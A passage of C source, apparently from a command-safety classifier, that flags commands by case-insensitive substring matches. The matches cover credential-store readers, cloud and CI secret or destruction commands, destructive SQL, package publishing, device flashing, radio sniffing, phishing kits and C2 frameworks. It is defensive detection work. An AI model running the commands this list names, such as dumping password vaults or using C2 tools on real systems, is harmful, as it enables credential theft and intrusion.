                     ci_contains(text, "disable") ||
                     ci_contains(text, "setdestination") ||
                     ci_contains(text, "removedestination") ||
                     ci_contains(text, "thinlocalsnapshots") ||
                     ci_contains(text, "deletelocalsnapshots") ||
                     ci_contains(text, "stopbackup") ||
                     ci_contains(text, "exclude"))) ||
                   (ci_contains(text, "softwareupdate") &&
                    (ci_contains(text, "--ignore") ||
                     ci_contains(text, "--schedule"))) ||
                   (ci_contains(text, "installer") &&
                    (ci_contains(text, " -pkg") ||
                     ci_contains(text, " -package"))) ||
                   (ci_contains(text, "jamf") &&
                    (ci_contains(text, " recon") ||
                     ci_contains(text, " policy") ||
                     ci_contains(text, " enroll") ||
                     ci_contains(text, "removeframework") ||
                     ci_contains(text, "resetpassword") ||
                     ci_contains(text, " manage") ||
                     ci_contains(text, " flush"))) ||
                   (ci_contains(text, "dseditgroup") &&
                    (ci_contains(text, " -o edit") ||
                     ci_contains(text, " -o create") ||
                     ci_contains(text, " -o delete") ||
                     ci_contains(text, " -a "))) ||
                   (ci_contains(text, "asr") &&
                    (ci_contains(text, " restore") ||
                     ci_contains(text, " erase"))) ||
                   (ci_contains(text, "bless") &&
                    (ci_contains(text, "--setboot") ||
                     ci_contains(text, " -folder") ||
                     ci_contains(text, " -mount") ||
                     ci_contains(text, " -device") ||
                     ci_contains(text, "--nextonly"))) ||
                   (ci_contains(text, "pmset") &&
                    (ci_contains(text, "disablesleep") ||
                     ci_contains(text, "autorestart") ||
                     ci_contains(text, "destroyfvkey"))) ||
                   (ci_contains(text, "lsregister") &&
                    (ci_contains(text, " -f") || ci_contains(text, " -r") ||
                     ci_contains(text, " -kill") ||
                     ci_contains(text, " -seed"))) ||
                   (ci_contains(text, "install_name_tool") &&
                    (ci_contains(text, " -id") ||
                     ci_contains(text, " -change") ||
                     ci_contains(text, " -rpath") ||
                     ci_contains(text, " -add_rpath") ||
                     ci_contains(text, " -delete_rpath"))) ||
                   ci_contains(text, "sandbox-exec") ||
                   (ci_contains(text, "ipmitool") &&
                    (ci_contains(text, " shell") ||
                     ci_contains(text, " sol") ||
                     ci_contains(text, " chassis") ||
                     ci_contains(text, " user") ||
                     ci_contains(text, " lan") ||
                     ci_contains(text, " sel") ||
                     ci_contains(text, " mc") ||
                     ci_contains(text, " bmc") ||
                     ci_contains(text, " raw") ||
                     ci_contains(text, " set"))) ||
                   ci_contains(text, "ipmiutil") ||
                   ci_contains(text, "ipmicfg") ||
                   ci_contains(text, "ipmi-config") ||
                   (ci_contains(text, "racadm") &&
                    (ci_contains(text, "racreset") ||
                     ci_contains(text, "serveraction") ||
                     ci_contains(text, " set") ||
                     ci_contains(text, " user") ||
                     ci_contains(text, "fwupdate") ||
                     ci_contains(text, " update") ||
                     ci_contains(text, "jobqueue"))) ||
                   ci_contains(text, "hponcfg") ||
                   ci_contains(text, "ilorest") ||
                   ci_contains(text, "tpm2_clear") ||
                   ci_contains(text, "tpm2_changeauth") ||
                   ci_contains(text, "tpm2_evictcontrol") ||
                   ci_contains(text, "tpm2_takeownership") ||
                   ci_contains(text, "tpm2_dictionarylockout") ||
                   ci_contains(text, "keepassxc-cli") ||
                   ci_contains(text, "kpcli") ||
                   ci_contains(text, "secret-tool") ||
                   ci_contains(text, "kwallet-query") ||
                   ci_contains(text, "lpass") ||
                   ci_contains(text, "gopass") ||
                   (ci_contains(text, "bw") &&
                    (ci_contains(text, " export") ||
                     ci_contains(text, " unlock") ||
                     ci_contains(text, " list"))) ||
                   (ci_contains(text, "keyring") &&
                    (ci_contains(text, " get") ||
                     ci_contains(text, " set"))) ||
                   (ci_contains(text, "nmcli") &&
                    ci_contains(text, " -s")) ||
                   ci_contains(text, "ssh-import-id") ||
                   (ci_contains(text, "redis-cli") &&
                    (ci_contains(text, " eval") ||
                     ci_contains(text, "flushall") ||
                     ci_contains(text, " config") ||
                     ci_contains(text, " debug") ||
                     ci_contains(text, " module") ||
                     ci_contains(text, "shutdown") ||
                     ci_contains(text, "slaveof") ||
                     ci_contains(text, "replicaof"))) ||
                   (ci_contains(text, "mongo") &&
                    ci_contains(text, "--eval")) ||
                   (ci_contains(text, "mongosh") &&
                    ci_contains(text, "--eval")) ||
                   (ci_contains(text, "ldapsearch") &&
                    (ci_contains(text, " -x") ||
                     ci_contains(text, " -h"))) ||
                   ci_contains(text, "ldapadd") ||
                   ci_contains(text, "ldapmodify") ||
                   ci_contains(text, "ldapdelete") ||
                   ci_contains(text, "ldapmodrdn") ||
                   ci_contains(text, "ldappasswd") ||
                   (ci_contains(text, "smbclient") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " \\\\"))) ||
                   (ci_contains(text, "rpcclient") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " -u"))) ||
                   (ci_contains(text, "showmount") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "rpcinfo") &&
                    ci_contains(text, " -p")) ||
                   (ci_contains(text, "aws") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " terminate") ||
                     ci_contains(text, " disable") ||
                     ci_contains(text, " stop-logging") ||
                     ci_contains(text, " purge") ||
                     ci_contains(text, "secretsmanager") ||
                     ci_contains(text, " ssm") ||
                     ci_contains(text, "sts assume") ||
                     ci_contains(text, "iam attach") ||
                     ci_contains(text, "iam create-login") ||
                     ci_contains(text, "iam put-user") ||
                     ci_contains(text, "iam add-user") ||
                     ci_contains(text, "iam update") ||
                     ci_contains(text, "s3 presign") ||
                     ci_contains(text, " kms"))) ||
                   (ci_contains(text, "gcloud") &&
                    (ci_contains(text, "compute ssh") ||
                     ci_contains(text, "compute scp") ||
                     ci_contains(text, "secrets") ||
                     ci_contains(text, "service-accounts keys") ||
                     ci_contains(text, "logging sinks") ||
                     ci_contains(text, "instances delete") ||
                     ci_contains(text, "clusters delete") ||
                     ci_contains(text, "deployments delete") ||
                     ci_contains(text, " kms"))) ||
                   (ci_contains(text, "az ") &&
                    (ci_contains(text, "keyvault") ||
                     ci_contains(text, "run-command") ||
                     ci_contains(text, "monitor"))) ||
                   (ci_contains(text, "ceph") &&
                    (ci_contains(text, " rm") ||
                     ci_contains(text, " destroy") ||
                     ci_contains(text, " purge") ||
                     ci_contains(text, " osd out") ||
                     ci_contains(text, " mds"))) ||
                   (ci_contains(text, "hdfs") &&
                    ci_contains(text, "dfs") &&
                    (ci_contains(text, "-rm") ||
                     ci_contains(text, "-expunge") ||
                     ci_contains(text, "-chmod") ||
                     ci_contains(text, "-chown") ||
                     ci_contains(text, "-setfacl"))) ||
                   (ci_contains(text, "rclone") &&
                    (ci_contains(text, " copy") ||
                     ci_contains(text, " move") ||
                     ci_contains(text, " sync") ||
                     ci_contains(text, " serve") ||
                     ci_contains(text, " lsd"))) ||
                   (ci_contains(text, "sshfs") &&
                    ci_contains(text, ":")) ||
                   ci_contains(text, "curlftpfs") ||
                   ci_contains(text, "davfs") ||
                   ci_contains(text, "nbd-client") ||
                   (ci_contains(text, "nmap") &&
                    ci_contains(text, " -"))) {
            what = "infra/cloud/container/cred-store/mac/forensic primitive";
        /* c243: mobile device control + RE/OSINT names + SCADA/
         * telephony/queue + DB destructive + supply publish + CI/
         * deploy + supervisor/journald + hardware/radio/input snoop +
         * fake infra + phish/C2 extras ── */
        } else if ((ci_contains(text, "adb") &&
                    (ci_contains(text, " shell") ||
                     ci_contains(text, " install") ||
                     ci_contains(text, " push") ||
                     ci_contains(text, " root") ||
                     ci_contains(text, " reboot") ||
                     ci_contains(text, " sideload") ||
                     ci_contains(text, " remount") ||
                     ci_contains(text, " disable-verity") ||
                     ci_contains(text, " unroot"))) ||
                   (ci_contains(text, "fastboot") &&
                    (ci_contains(text, " flash") ||
                     ci_contains(text, " oem") ||
                     ci_contains(text, " erase") ||
                     ci_contains(text, " reboot") ||
                     ci_contains(text, " unlock") ||
                     ci_contains(text, " format") ||
                     ci_contains(text, " set_active"))) ||
                   (ci_contains(text, "heimdall") &&
                    ci_contains(text, " flash")) ||
                   ci_contains(text, "mtkclient") ||
                   (ci_contains(text, "edl") &&
                    (ci_contains(text, "flash") ||
                     ci_contains(text, "qfil"))) ||
                   ci_contains(text, "scrcpy") ||
                   ci_contains(text, "sndcpy") ||
                   ci_contains(text, "ideviceinstaller") ||
                   ci_contains(text, "idevicebackup") ||
                   ci_contains(text, "idevicediagnostics") ||
                   ci_contains(text, "ideviceinfo") ||
                   ci_contains(text, "idevicerestore") ||
                   ci_contains(text, "idevicepair") ||
                   ci_contains(text, "idevicerestore") ||
                   ci_contains(text, "ios-deploy") ||
                   ci_contains(text, "ifuse") ||
                   ci_contains(text, "iproxy") ||
                   ci_contains(text, "idevicedebug") ||
                   ci_contains(text, "checkra1n") ||
                   ci_contains(text, "palera1n") ||
                   ci_contains(text, "magisk") ||
                   (ci_contains(text, "frida") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "frida-trace") ||
                   ci_contains(text, "frida-ps") ||
                   ci_contains(text, "objection") ||
                   ci_contains(text, "apktool") ||
                   ci_contains(text, "jadx") ||
                   (ci_contains(text, "apksigner") &&
                    (ci_contains(text, "sign") ||
                     ci_contains(text, "rotate"))) ||
                   ci_contains(text, "d2j-dex2jar") ||
                   ci_contains(text, "baksmali") ||
                   ci_contains(text, "quark-engine") ||
                   ci_contains(text, "drozer") ||
                   ci_contains(text, "mobsf") ||
                   ci_contains(text, "radare2") ||
                   ci_contains(text, "rabin2") ||
                   ci_contains(text, "rasm2") ||
                   ci_contains(text, "radiff2") ||
                   ci_contains(text, "rizin") ||
                   ci_contains(text, "idat64") ||
                   ci_contains(text, "idat32") ||
                   ci_contains(text, "ghidra") ||
                   ci_contains(text, "analyzeheadless") ||
                   ci_contains(text, "retdec") ||
                   (ci_contains(text, "cutter") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "binaryninja") ||
                    ci_contains(text, "bndb")) ||
                   (ci_contains(text, "hopper") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "edb") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "x64dbg") ||
                   ci_contains(text, "x32dbg") ||
                   (ci_contains(text, "windbg") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "immunitydebugger") ||
                   ci_contains(text, "pwndbg") ||
                   ci_contains(text, "gef") ||
                   ci_contains(text, "peda") ||
                   (ci_contains(text, "capa") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "floss") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "binlex") ||
                   (ci_contains(text, "yara") &&
                    (ci_contains(text, ".yar") ||
                     ci_contains(text, " -r") ||
                     ci_contains(text, " -f") ||
                     ci_contains(text, " -p") ||
                     ci_contains(text, " -s") ||
                     ci_contains(text, " -w") ||
                     ci_contains(text, " -n") ||
                     ci_contains(text, " -m"))) ||
                   ci_contains(text, "theharvester") ||
                   ci_contains(text, "recon-ng") ||
                   ci_contains(text, "spiderfoot") ||
                   (ci_contains(text, "sherlock") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "holehe") ||
                   ci_contains(text, "ghunt") ||
                   ci_contains(text, "phoneinfoga") ||
                   ci_contains(text, "metagoofil") ||
                   (ci_contains(text, "shodan") &&
                    (ci_contains(text, " search") ||
                     ci_contains(text, " host") ||
                     ci_contains(text, " count") ||
                     ci_contains(text, " download") ||
                     ci_contains(text, " scan") ||
                     ci_contains(text, " parse") ||
                     ci_contains(text, " alert") ||
                     ci_contains(text, " domain") ||
                     ci_contains(text, " honeyscore") ||
                     ci_contains(text, " init") ||
                     ci_contains(text, " org"))) ||
                   (ci_contains(text, "censys") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "dnstwist") ||
                   ci_contains(text, "trufflehog") ||
                   ci_contains(text, "gitleaks") ||
                   ci_contains(text, "shhgit") ||
                   ci_contains(text, "gitrob") ||
                   ci_contains(text, "detect-secrets") ||
                   ci_contains(text, "mbpoll") ||
                   ci_contains(text, "modpoll") ||
                   ci_contains(text, "snap7") ||
                   ci_contains(text, "pymodbus") ||
                   (ci_contains(text, "asterisk") &&
                    (ci_contains(text, " -r") ||
                     ci_contains(text, " -x"))) ||
                   (ci_contains(text, "fs_cli") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "kamcmd") ||
                   ci_contains(text, "kamctl") ||
                   ci_contains(text, "opensips-cli") ||
                   (ci_contains(text, "mmcli") &&
                    (ci_contains(text, " -m") ||
                     ci_contains(text, " --"))) ||
                   (ci_contains(text, "qmicli") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "mbimcli") &&
                    (ci_contains(text, " -d") ||
                     ci_contains(text, " -p") ||
                     ci_contains(text, "--query") ||
                     ci_contains(text, "--set") ||
                     ci_contains(text, "--connect") ||
                     ci_contains(text, "--disconnect"))) ||
                   ci_contains(text, "mosquitto_pub") ||
                   ci_contains(text, "mosquitto_sub") ||
                   (ci_contains(text, "emqx") &&
                    (ci_contains(text, " ctl") ||
                     ci_contains(text, " eval") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " kill"))) ||
                   ci_contains(text, "rabbitmqctl") ||
                   ci_contains(text, "rabbitmqadmin") ||
                   ci_contains(text, "kafka-topics") ||
                   ci_contains(text, "kafka-console-") ||
                   ci_contains(text, "kafka-acls") ||
                   ci_contains(text, "kafka-configs") ||
                   ci_contains(text, "kafka-producer") ||
                   ci_contains(text, "kafka-consumer-") ||
                   ci_contains(text, "kafka-delete-records") ||
                   ci_contains(text, "pulsar-admin") ||
                   ci_contains(text, "pulsar-client") ||
                   (ci_contains(text, "nats-") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "zkcli") ||
                   ci_contains(text, "flush_all") ||
                   (ci_contains(text, "psql") &&
                    (ci_contains(text, " drop ") ||
                     ci_contains(text, " truncate") ||
                     ci_contains(text, " delete "))) ||
                   (ci_contains(text, "mysql") &&
                    (ci_contains(text, " drop ") ||
                     ci_contains(text, " truncate") ||
                     ci_contains(text, " delete "))) ||
                   (ci_contains(text, "sqlcmd") &&
                    (ci_contains(text, "drop table") ||
                     ci_contains(text, "drop database") ||
                     ci_contains(text, "truncate table") ||
                     ci_contains(text, "delete from"))) ||
                   (ci_contains(text, "cqlsh") &&
                    (ci_contains(text, "drop table") ||
                     ci_contains(text, "drop keyspace") ||
                     ci_contains(text, "truncate"))) ||
                   (ci_contains(text, "beeline") &&
                    (ci_contains(text, "drop table") ||
                     ci_contains(text, "drop database") ||
                     ci_contains(text, "truncate table") ||
                     ci_contains(text, "delete from"))) ||
                   (ci_contains(text, "clickhouse-client") &&
                    (ci_contains(text, "drop table") ||
                     ci_contains(text, "drop database") ||
                     ci_contains(text, "truncate table") ||
                     ci_contains(text, "delete from") ||
                     ci_contains(text, "detach"))) ||
                   (ci_contains(text, "influx") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " drop"))) ||
                   (ci_contains(text, "bq ") &&
                    (ci_contains(text, " rm") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " rm -rf"))) ||
                   (ci_contains(text, "snowsql") &&
                    (ci_contains(text, "drop ") ||
                     ci_contains(text, "delete "))) ||
                   (ci_contains(text, "arangosh") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "cypher-shell") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "db2") &&
                    (ci_contains(text, " drop ") ||
                     ci_contains(text, " deactivate"))) ||
                   (ci_contains(text, "impala-shell") &&
                    (ci_contains(text, " drop ") ||
                     ci_contains(text, " -q") ||
                     ci_contains(text, " -f") ||
                     ci_contains(text, " --impalad"))) ||
                   (ci_contains(text, "presto") &&
                    (ci_contains(text, " drop ") ||
                     ci_contains(text, " --execute"))) ||
                   (ci_contains(text, "trino") &&
                    (ci_contains(text, " drop ") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " --execute"))) ||
                   (ci_contains(text, "npm") &&
                    (ci_contains(text, " publish") ||
                     ci_contains(text, " unpublish") ||
                     ci_contains(text, " deprecate") ||
                     ci_contains(text, " unstar") ||
                     ci_contains(text, " access"))) ||
                   (ci_contains(text, "yarn") &&
                    (ci_contains(text, " publish") ||
                     ci_contains(text, " unpublish") ||
                     ci_contains(text, " application -kill") ||
                     ci_contains(text, " -kill"))) ||
                   (ci_contains(text, "twine") &&
                    ci_contains(text, " upload")) ||
                   (ci_contains(text, "cargo") &&
                    (ci_contains(text, " publish") ||
                     ci_contains(text, " yank"))) ||
                   (ci_contains(text, "gem") &&
                    ci_contains(text, " push")) ||
                   (ci_contains(text, "conan") &&
                    (ci_contains(text, " upload") ||
                     ci_contains(text, " remove"))) ||
                   (ci_contains(text, "nuget") &&
                    (ci_contains(text, " push") ||
                     ci_contains(text, " delete"))) ||
                   (ci_contains(text, "dotnet nuget") &&
                    (ci_contains(text, " push") ||
                     ci_contains(text, " delete"))) ||
                   (ci_contains(text, "oras") &&
                    ci_contains(text, " push")) ||
                   (ci_contains(text, "jfrog") &&
                    (ci_contains(text, " rt u") ||
                     ci_contains(text, " rt upload") ||
                     ci_contains(text, " rt del") ||
                     ci_contains(text, " rt delete"))) ||
                   (ci_contains(text, "mvn") &&
                    (ci_contains(text, " deploy") ||
                     ci_contains(text, " release"))) ||
                   (ci_contains(text, "gradle") &&
                    ci_contains(text, " publish")) ||
                   (ci_contains(text, "poetry") &&
                    ci_contains(text, " publish")) ||
                   (ci_contains(text, "pnpm") &&
                    ci_contains(text, " publish")) ||
                   (ci_contains(text, "gh ") &&
                    (ci_contains(text, "workflow run") ||
                     ci_contains(text, "secret ") ||
                     ci_contains(text, "variable ") ||
                     ci_contains(text, " api") ||
                     ci_contains(text, " release delete") ||
                     ci_contains(text, " release upload") ||
                     ci_contains(text, " repo delete") ||
                     ci_contains(text, " auth ") ||
                     ci_contains(text, " gpg-key") ||
                     ci_contains(text, " ssh-key") ||
                     ci_contains(text, " run watch") ||
                     ci_contains(text, " workflow disable") ||
                     ci_contains(text, " workflow enable"))) ||
                   (ci_contains(text, "glab") &&
                    (ci_contains(text, " ci ") ||
                     ci_contains(text, " variable") ||
                     ci_contains(text, " release") ||
                     ci_contains(text, " auth") ||
                     ci_contains(text, " repo delete"))) ||
                   (ci_contains(text, "fly ") &&
                    (ci_contains(text, "set-pipeline") ||
                     ci_contains(text, "destroy-pipeline") ||
                     ci_contains(text, " hijack") ||
                     ci_contains(text, " unpause") ||
                     ci_contains(text, "pause") ||
                     ci_contains(text, "trigger-job") ||
                     ci_contains(text, "validate-pipeline"))) ||
                   (ci_contains(text, "flyctl") &&
                    (ci_contains(text, " destroy") ||
                     ci_contains(text, " deploy") ||
                     ci_contains(text, " scale") ||
                     ci_contains(text, " secrets") ||
                     ci_contains(text, " ssh"))) ||
                   (ci_contains(text, "jenkins-cli") ||
                    ci_contains(text, "jenkins-cli.jar")) ||
                   (ci_contains(text, "gitlab-runner") &&
                    (ci_contains(text, " register") ||
                     ci_contains(text, " unregister") ||
                     ci_contains(text, " exec"))) ||
                   (ci_contains(text, "circleci") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " build") ||
                     ci_contains(text, " orb") ||
                     ci_contains(text, " setup") ||
                     ci_contains(text, " execute") ||
                     ci_contains(text, " process") ||
                     ci_contains(text, " follow"))) ||
                   (ci_contains(text, "travis") &&
                    (ci_contains(text, " init") ||
                     ci_contains(text, " encrypt") ||
                     ci_contains(text, " ssh") ||
                     ci_contains(text, " token") ||
                     ci_contains(text, " env") ||
                     ci_contains(text, " enable") ||
                     ci_contains(text, " disable") ||
                     ci_contains(text, " sync") ||
                     ci_contains(text, " run"))) ||
                   (ci_contains(text, "drone") &&
                    (ci_contains(text, " build") ||
                     ci_contains(text, " exec") ||
                     ci_contains(text, " secret") ||
                     ci_contains(text, " sign") ||
                     ci_contains(text, " server") ||
                     ci_contains(text, " agent") ||
                     ci_contains(text, " promote") ||
                     ci_contains(text, " deploy") ||
                     ci_contains(text, " rollback") ||
                     ci_contains(text, " repo"))) ||
                   (ci_contains(text, "buildkite-agent") &&
                    (ci_contains(text, " -") ||
                     ci_contains(text, " start") ||
                     ci_contains(text, " agent"))) ||
                   (ci_contains(text, "sls") &&
                    (ci_contains(text, " deploy") ||
                     ci_contains(text, " remove") ||
                     ci_contains(text, " rollback") ||
                     ci_contains(text, " invoke"))) ||
                   (ci_contains(text, "serverless") &&
                    (ci_contains(text, " deploy") ||
                     ci_contains(text, " remove") ||
                     ci_contains(text, " invoke"))) ||
                   (ci_contains(text, "sam") &&
                    (ci_contains(text, " deploy") ||
                     ci_contains(text, " delete"))) ||
                   (ci_contains(text, "railway") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " up") ||
                     ci_contains(text, " down") ||
                     ci_contains(text, " run"))) ||
                   (ci_contains(text, "vercel") &&
                    (ci_contains(text, " rm") ||
                     ci_contains(text, " env") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " redeploy"))) ||
                   (ci_contains(text, "netlify") &&
                    (ci_contains(text, " unlink") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " deploy") ||
                     ci_contains(text, " env"))) ||
                   (ci_contains(text, "heroku") &&
                    (ci_contains(text, "apps:destroy") ||
                     ci_contains(text, "addons:destroy") ||
                     ci_contains(text, "config:set") ||
                     ci_contains(text, "config:unset") ||
                     ci_contains(text, "ps:scale") ||
                     ci_contains(text, "maintenance:") ||
                     ci_contains(text, "releases") ||
                     ci_contains(text, "drains") ||
                     ci_contains(text, "access:") ||
                     ci_contains(text, "certs") ||
                     ci_contains(text, "pg:kill") ||
                     ci_contains(text, "pg:reset") ||
                     ci_contains(text, "pg:backups"))) ||
                   (ci_contains(text, "vagrant") &&
                    (ci_contains(text, " destroy") ||
                     ci_contains(text, " package"))) ||
                   (ci_contains(text, "pm2") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " kill") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " startup") ||
                     ci_contains(text, " save") ||
                     ci_contains(text, " resurrect") ||
                     ci_contains(text, " reload") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " unstartup"))) ||
                   (ci_contains(text, "supervisorctl") &&
                    (ci_contains(text, " stop") ||
                     ci_contains(text, " shutdown") ||
                     ci_contains(text, " update") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " signal") ||
                     ci_contains(text, " remove") ||
                     ci_contains(text, " add"))) ||
                   (ci_contains(text, "monit ") &&
                    (ci_contains(text, " unmonitor") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " quit") ||
                     ci_contains(text, " reload") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " monitor") ||
                     ci_contains(text, " start"))) ||
                   (ci_contains(text, "god") &&
                    (ci_contains(text, " stop") ||
                     ci_contains(text, " terminate") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " unmonitor"))) ||
                   (ci_contains(text, "bluepill") &&
                    (ci_contains(text, " stop") ||
                     ci_contains(text, " quit") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " load"))) ||
                   (ci_contains(text, "svcadm") &&
                    (ci_contains(text, " disable") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " clear") ||
                     ci_contains(text, " mark") ||
                     ci_contains(text, " restart") ||
                     ci_contains(text, " refresh") ||
                     ci_contains(text, " enable"))) ||
                   (ci_contains(text, "journalctl") &&
                    (ci_contains(text, "--vacuum") ||
                     ci_contains(text, " --rotate") ||
                     ci_contains(text, " --flush") ||
                     ci_contains(text, " --sync") ||
                     ci_contains(text, " --relinquish") ||
                     ci_contains(text, " --header"))) ||
                   (ci_contains(text, "sysrq-trigger") &&
                    ci_contains(text, " >")) ||
                   (ci_contains(text, "flashrom") &&
                    (ci_contains(text, " -w") ||
                     ci_contains(text, " -e") ||
                     ci_contains(text, "--erase") ||
                     ci_contains(text, "-programmer") ||
                     ci_contains(text, " -p"))) ||
                   (ci_contains(text, "dfu-util") &&
                    (ci_contains(text, " -d") ||
                     ci_contains(text, " -a") ||
                     ci_contains(text, " -e") ||
                     ci_contains(text, " -w"))) ||
                   (ci_contains(text, "avrdude") &&
                    (ci_contains(text, " -u") ||
                     ci_contains(text, " -e") ||
                     ci_contains(text, " -c"))) ||
                   (ci_contains(text, "esptool") &&
                    (ci_contains(text, "write_flash") ||
                     ci_contains(text, "erase_flash") ||
                     ci_contains(text, "flash_id") ||
                     ci_contains(text, "read_flash") ||
                     ci_contains(text, "verify_flash") ||
                     ci_contains(text, "dump_mem") ||
                     ci_contains(text, "load_ram") ||
                     ci_contains(text, "write_mem") ||
                     ci_contains(text, "merge_bin") ||
                     ci_contains(text, "elf2image") ||
                     ci_contains(text, "run"))) ||
                   (ci_contains(text, "usbreset") &&
                    ci_contains(text, " /dev")) ||
                   (ci_contains(text, "usb_modeswitch") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "openocd") &&
                    (ci_contains(text, " -f") ||
                     ci_contains(text, " -c"))) ||
                   ci_contains(text, "gpioset") ||
                   ci_contains(text, "i2cset") ||
                   ci_contains(text, "spidev") ||
                   ci_contains(text, "nandwrite") ||
                   ci_contains(text, "nandtest") ||
                   ci_contains(text, "ubiformat") ||
                   ci_contains(text, "mtd_debug") ||
                   (ci_contains(text, "nanddump") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "hackrf_transfer") ||
                   ci_contains(text, "hackrf_sweep") ||
                   ci_contains(text, "hackrf_specan") ||
                   ci_contains(text, "rtl_sdr") ||
                   ci_contains(text, "rtl_fm") ||
                   ci_contains(text, "airprobe") ||
                   ci_contains(text, "kalibrate") ||
                   ci_contains(text, "ubertooth") ||
                   ci_contains(text, "btmon") ||
                   ci_contains(text, "btproxy") ||
                   ci_contains(text, "bleah") ||
                   (ci_contains(text, "crackle") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "hcitool") &&
                    (ci_contains(text, " -") ||
                     ci_contains(text, "scan") ||
                     ci_contains(text, " le"))) ||
                   (ci_contains(text, "gatttool") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "bluetoothctl") &&
                    (ci_contains(text, " pair") ||
                     ci_contains(text, " connect") ||
                     ci_contains(text, "connectable") ||
                     ci_contains(text, "discoverable") ||
                     ci_contains(text, " agent") ||
                     ci_contains(text, " power"))) ||
                   ci_contains(text, "proxmark3") ||
                   ci_contains(text, "pm3") ||
                   ci_contains(text, "mfoc") ||
                   ci_contains(text, "mfcuk") ||
                   ci_contains(text, "nfc-list") ||
                   ci_contains(text, "killerbee") ||
                   ci_contains(text, "zbwd") ||
                   ci_contains(text, "zbgoodfind") ||
                   ci_contains(text, "zbreplay") ||
                   ci_contains(text, "zbstumbler") ||
                   ci_contains(text, "zbdump") ||
                   ci_contains(text, "zbsniff") ||
                   ci_contains(text, "zbassocflood") ||
                   ci_contains(text, "gps-sdr-sim") ||
                   ci_contains(text, "gpsfaker") ||
                   ci_contains(text, "fakegps") ||
                   ci_contains(text, "gnss-sdr") ||
                   ci_contains(text, "evtest") ||
                   (ci_contains(text, "libinput") &&
                    (ci_contains(text, " debug") ||
                     ci_contains(text, " record"))) ||
                   ci_contains(text, "showkey") ||
                   ci_contains(text, "dumpkeys") ||
                   (ci_contains(text, "wev") &&
                    !ci_contains(text, "wevtutil")) ||
                   ci_contains(text, "wshowkeys") ||
                   (ci_contains(text, "xinput") &&
                    (ci_contains(text, " test") ||
                     ci_contains(text, " set") ||
                     ci_contains(text, " map") ||
                     ci_contains(text, " float") ||
                     ci_contains(text, " reattach") ||
                     ci_contains(text, " disable") ||
                     ci_contains(text, " enable"))) ||
                   (ci_contains(text, "hyprctl") &&
                    (ci_contains(text, " dispatch") ||
                     ci_contains(text, " keyword") ||
                     ci_contains(text, " reload") ||
                     ci_contains(text, " exec"))) ||
                   (ci_contains(text, "swaymsg") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " -m"))) ||
                   (ci_contains(text, "i3-msg") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " -m"))) ||
                   ci_contains(text, "fakedns") ||
                   ci_contains(text, "fakenet") ||
                   ci_contains(text, "inetsim") ||
                   ci_contains(text, "apatedns") ||
                   ci_contains(text, "remnux") ||
                   ci_contains(text, "hiddeneye") ||
                   ci_contains(text, "hidden-eye") ||
                   (ci_contains(text, "seeker") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "socialfish") ||
                   ci_contains(text, "social-phish") ||
                   ci_contains(text, "nexphisher") ||
                   ci_contains(text, "camphish") ||
                   ci_contains(text, "sayhello") ||
                   ci_contains(text, "stormbreaker") ||
                   ci_contains(text, "pyphisher") ||
                   ci_contains(text, "madphish") ||
                   ci_contains(text, "mrphish") ||
                   ci_contains(text, "evilurl") ||
                   ci_contains(text, "evil-winrm") ||
                   (ci_contains(text, "villain") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "mythic") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "covenant") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "havoc") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "darkcomet") ||
                   ci_contains(text, "poisonivy") ||
                   ci_contains(text, "poison-ivy") ||
                   ci_contains(text, "gh0st") ||
                   ci_contains(text, "backdoor-factory") ||
                   ci_contains(text, "bdfproxy") ||
                   (ci_contains(text, "unicorn") &&
                    (ci_contains(text, ".py") ||
                     ci_contains(text, " -"))) ||
                   (ci_contains(text, "scarecrow") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "nimcrypt") ||
                   ci_contains(text, "nimplant") ||
                   (ci_contains(text, "upx") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "printui") &&
                    (ci_contains(text, "/ga") ||
                     ci_contains(text, "/gd") ||
                     ci_contains(text, "/ge") ||
                     ci_contains(text, "/dd") ||
